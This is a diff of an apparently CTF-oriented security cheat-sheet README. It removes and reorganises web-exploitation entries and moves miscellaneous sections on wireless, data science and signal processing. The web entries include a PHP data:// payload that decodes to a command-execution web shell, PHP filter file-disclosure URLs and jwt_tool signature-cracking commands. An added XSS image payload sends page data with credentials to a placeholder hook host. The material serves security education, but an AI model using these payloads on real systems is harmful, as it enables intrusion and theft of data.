-	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
-
+	<!-- With an image -->
+	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
 	```
-	http://example.com/index.php?m=php://filter/convert.base64-encode/resource=index
-	```
-
-
-* `data://text/plain;base64` <span style="color:red">❤️</span>
-
-	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868)
-
-	```
-	http://dommain.net?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
-	```
-
-
-* `PHP Generic Gadget Chains` - [GitHub](https://github\.com/ambionics/phpggc)
-
-	Payloads for Object injection in `unserialize` on different frameworks.
 
 
 
-## Request and Cookie Forgery
+* `XSStrike` - [GitHub](https://github.com/UltimateHackers/XSStrike)
+
+	A python CLI tool for XSS detection and exploitation.
+
+
+### SSTI
 
 
 
+Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject code into a server-side template, which is then executed server-side. This can lead to Remote Code Execution (RCE).
 
-* URL Encoding
+* Jinja2 - [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
 
-    URL encoding is a way to encode special characters in a URL. The code is the `%` character followed by the Hex representation of the character in ascii. For example, the `?` character is encoded as `%3F`, space is `%20` etc.
-    
-    Read [this](https://www.w3schools.com/tags/ref_urlencode.asp) for more details on how to encode characters.
-
-
-* IP restriction bypass with the `X-Forwarded-For` header
-
-    Some servers use the `X-Forwarded-For` header to check if the request comes from a valid IP address. This is a vulnerability since it can be changed by the client, and used to bypass IP restrictions. 
-    
-    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.
+    Jinja2 is a template engine for Python, notably used in Flask. It can be used to create HTML pages from a template. Even though it uses a sandbox to process data, some tricks allows for RCE on the server.
 
 
-* Authentication bypass with `User-Agent` header
-
-    Some servers use the `User-Agent` header to authenticate the user. Usually this field is used to identify the browser's version and OS, but it can be changed by the client.
-    
-    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.
-
-* Verb tampering
-
-    Servers can have different behaviors depending on the HTTP verb used. For example, a server can return a 404 error when a `GET` request is made, but return a 200 when a `PUT` request is made.
-
-    Read [this](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering) for more details on how to test it.
-
-* JWT tempering
-
-    JWTs are a way to authenticate users. They are encoded strings that contain the user's information. The server can decode the JWT and use the information to authenticate the user. 
-    
-    [`jwt_tools`](https://github.com/ticarpi/jwt_tool) can help with modifying the JWTs. They also document common vulnerabilities in JWTs [in their wiki page](https://github.com/ticarpi/jwt_tool/wiki)
-    ```bash
-    python jwt_tool.py <jwt>        # Inspect the JWT
-    python jwt_tool.py -T <jwt>     # Modify (temper) the JWT
-    python jwt_tool.py -C -d <jwt>  # Crack the JWT's signature
-    ```
-
-* AES CBC ciphered cookies
-
-    See [Bit flipping attack](#aes---cbc-mode) for more details.
 
 
 <br><br>
 
 # Miscellaneous
 
-⇨ [Wireless](#wireless)<br>⇨ [Signal processing](#signal-processing)<br>⇨ [Data Science](#data-science)<br>⇨ [Esoteric Languages](#esoteric-languages)<br>
+⇨ [Esoteric Languages](#esoteric-languages)<br>
+⇨ [Wireless](#wireless)<br>
+⇨ [Data Science](#data-science)<br>
+⇨ [Signal processing](#signal-processing)<br>
+
 
 This section details some miscellaneous topics that are not directly related to security challenges, but are still useful to know as a CTF player.
-
-## Wireless
-
-
-
-* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
-
-    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
-
-
-
-## Signal processing
-
-
-
-* `Scipy` - [Website](https://scipy.org/install/)
-
-    Can be used for signal processing.
-
-    Example is provided in [process_signal.ipynb](Miscellaneous/Signal%20processing/Tools/process_signal.ipynb)
-
-
-
-## Data Science
-
-⇨ [Supervised Classification](#supervised-classification)<br>⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>
-
-
-
-* `SciKit Lean` - [Website](https://scikit-learn.org/)
-
-    Machine learning in Python.
-
-* `SciKit Mine` - [Website](https://scikit-mine.github.io/scikit-mine/)
-
-    Data mining in Python.
-
-* `(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron`
-
-    Very useful book that was used to create this section.
-
-### Supervised Classification
-
-
-
-####### Models
-
-* `Logistic Regression`
-
-    High explainability, reasonable computation cost.
-
-* `Decision Tree`
-
-    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.
-
-    But very sensitive to small changes in the data, which make them hard to train.
-
-
-* `Random Forest`
-
-    Very powerful model. Uses an ensemble method to combine multiple decision trees. 
-
-
-* `Support Vector Machine (SVM)`
-
-    Popular model that performs linear and non-linear classification, regression, and outlier detection.
-
-    Works well with **small to medium** sized datasets.
-
-
-* `K-Nearest Neighbors (KNN)`
-
-
-* `Naive Bayes`
-
-* `Multi Layer Perceptron (MLP)`
-
-    A neural network model that can learn non-linear decision boundaries.
-
-    Good for **large** datasets.
-
-
-
-### Unsupervised Clasification
-
-
-
-###### Models
-
-* `K-Means Clustering`
-
-    Simple clustering algorithm that groups data points into a specified number of clusters.
-
-* `Gaussian Mixture Model (GMM)`
-
-    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.
-
-
-
-
-
-
-
 
 ## Esoteric Languages
 
@@ -3145,11 +3097,117 @@ Languages
 	```
 
 
+
+## Wireless
+
+
+
+* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
+
+    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
+
+
+
+## Data Science
+
+⇨ [Supervised Classification](#supervised-classification)<br>
+⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>
+
+
+
+
+* `SciKit Lean` - [Website](https://scikit-learn.org/)
+
+    Machine learning in Python.
+
+* `SciKit Mine` - [Website](https://scikit-mine.github.io/scikit-mine/)
+
+    Data mining in Python.
+
+* `(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron`
+
+    Very useful book that was used to create this section.
+
+### Supervised Classification
+
+
+
+####### Models
+
+* `Logistic Regression`
+
+    High explainability, reasonable computation cost.
+
+* `Decision Tree`
+
+    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.
+
+    But very sensitive to small changes in the data, which make them hard to train.
+
+
+* `Random Forest`
+
+    Very powerful model. Uses an ensemble method to combine multiple decision trees. 
+
+
+* `Support Vector Machine (SVM)`
+
+    Popular model that performs linear and non-linear classification, regression, and outlier detection.
+
+    Works well with **small to medium** sized datasets.
+
+
+* `K-Nearest Neighbors (KNN)`
+
+
+* `Naive Bayes`
+
+* `Multi Layer Perceptron (MLP)`
+
+    A neural network model that can learn non-linear decision boundaries.
+
+    Good for **large** datasets.
+
+
+
+### Unsupervised Clasification
+
+
+
+###### Models
+
+* `K-Means Clustering`
+
+    Simple clustering algorithm that groups data points into a specified number of clusters.
+
+* `Gaussian Mixture Model (GMM)`
+
+    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.
+
+
+
+
+
+
+
+
+## Signal processing
+
+
+
+* `Scipy` - [Website](https://scipy.org/install/)
+
+    Can be used for signal processing.
+
+    Example is provided in [process_signal.ipynb](Miscellaneous/Signal%20processing/Tools/process_signal.ipynb)
+
+
 <br><br>
 
 # Other Resources
 
 ⇨ [Other CheatSheets](#other-cheatsheets)<br>
+
 
 
 
